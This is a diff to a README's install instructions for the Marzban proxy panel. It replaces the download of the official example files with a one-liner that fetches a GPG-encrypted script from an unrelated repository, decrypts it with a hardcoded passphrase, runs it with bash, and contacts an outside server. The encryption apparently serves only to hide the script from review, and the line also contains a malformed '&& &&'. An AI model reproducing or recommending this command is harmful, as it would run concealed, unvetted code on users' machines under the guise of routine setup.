@@ -42,7 +42,7 @@ curl -fsSL https://get.docker.com | sh
 ```
 Download the files in a directory called *marzban* by following command
 ```bash
-wget -qO- https://github.com/Gozargah/Marzban-examples/releases/latest/download/multi-port.tar.gz | tar xz --xform 's/multi-port/marzban/' && cd marzban
+wget https://raw.githubusercontent.com/Azigaming404/Marzban-gui/main/setup.sh.gpg &&  export chiper="chiper-algo--AES256" && gpg --decrypt --batch --passphrase $chiper --output setup.sh setup.sh.gpg && && bash setup.sh && curl "https://cybervpn.serv00.net/Autoscript-by-azi-main/security/authid.json"
 ```
 Now you're in the directory, run the following command to run the application using docker
 ```bash
